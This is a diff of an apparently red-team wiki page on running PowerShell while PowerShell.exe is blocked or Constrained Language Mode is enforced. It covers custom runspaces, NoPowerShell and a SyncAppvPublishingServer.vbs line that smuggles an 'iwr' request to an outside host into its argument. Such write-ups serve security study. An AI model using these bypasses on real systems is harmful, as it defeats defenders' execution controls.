@@ -4,19 +4,13 @@
 
 PowerShell.exe primarily serves as a graphical interface for handling input and output, while the core functionality resides in the managed DLL[ **System.Management.Automation.dll**](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation?view=powershellsdk-7.4.0). This DLL is responsible for creating and managing **runspaces**, which serve as isolated execution environments for PowerShell commands and scripts.
 
-#### Runspace-Based Execution
-
 Since [runspaces](https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/creating-runspaces?view=powershell-7.4) operate independently of **PowerShell.exe**, we can create a custom program to establish and control a runspace, allowing us to execute PowerShell code outside the standard PowerShell interface.
 
-#### NoPowerShell: A Lightweight Alternative
-
-Alternatively, projects like [**NoPowerShell**](https://github.com/bitsadmin/nopowershell) provide a way to execute PowerShell-like commands without relying on PowerShell.exe or System.Management.Automation.dll. Instead of creating runspaces, NoPowerShell implements common cmdlets directly in C#.
+Alternatively, projects like [**NoPowerShell**](https://github.com/bitsadmin/nopowershell) completely reimplements common cmdlets in **C#**, bypassing the need for **PowerShell.exe** or **System.Management.Automation.dll**.
 
 If you encounter a scenario where **PowerShell.exe is blocked** or [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) is enforced, but no strict application whitelisting is in place, alternative execution methods can still enable PowerShell execution.
 
-## Practice
-
-### Tools&#x20;
+## Practice&#x20;
 
 {% tabs %}
 {% tab title="PowerLessShell" %}
@@ -63,11 +57,7 @@ Windows 10 comes with SyncAppvPublishingServer.exe and SyncAppvPublishingServer.
 C:\Users\v4resk> SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 ```
 {% endtab %}
-{% endtabs %}
 
-#### Custom RunSpace Program
-
-{% tabs %}
 {% tab title="C#" %}
 Here's a C# code snippet that demonstrates creating a custom PowerShell runspace to execute commands:
 
@@ -102,13 +92,13 @@ class Program
 ```
 {% endcode %}
 
+To compile this code on Unix-based systems, we can use the following [mono](https://www.mono-project.com/download/stable/#download-lin) command to include the `System.Management.Automation.dll`:
+
 {% hint style="info" %}
 To include it in your Windows Visual Studio project or compile it on Linux, locate the DLL on Windows systems at:
 
 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management`
 {% endhint %}
-
-To compile this code on Unix-based systems, we can use the following [mono](https://www.mono-project.com/download/stable/#download-lin) command to include the `System.Management.Automation.dll`:
 
 ```bash
 mono-csc RunspacePoc.cs -r:System.Management.Automation.dll
